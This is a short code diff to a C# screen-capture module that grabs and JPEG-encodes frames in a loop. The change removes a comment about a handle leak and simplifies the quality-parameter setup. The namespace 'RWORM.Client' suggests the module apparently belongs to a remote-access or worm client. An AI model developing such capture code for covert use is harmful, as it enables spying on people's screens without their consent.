@@ -46,10 +46,6 @@ namespace RWORM.Client.Modules
             int interval = 1000 / Math.Max(1, Fps);
             var enc      = GetJpegEncoder();
 
-            // Dispose the encoder params each iteration. They hold native
-            // GDI+ handles; leaking them at 10 fps exhausted the process GDI
-            // handle limit and crashed the client (blank screen / crash on
-            // CopyFromScreen).
             while (_running && !(_cts?.IsCancellationRequested ?? true))
             {
                 try
@@ -69,10 +65,7 @@ namespace RWORM.Client.Modules
                     using (var ms = new MemoryStream())
                     using (var encParms = new EncoderParameters(1))
                     {
-                        encParms.Param = new[]
-                        {
-                            new EncoderParameter(Encoder.Quality, (long)Quality)
-                        };
+                        encParms.Param[0] = new EncoderParameter(Encoder.Quality, (long)Quality);
                         bmp.Save(ms, enc, encParms);
                         frame = ms.ToArray();
                     }
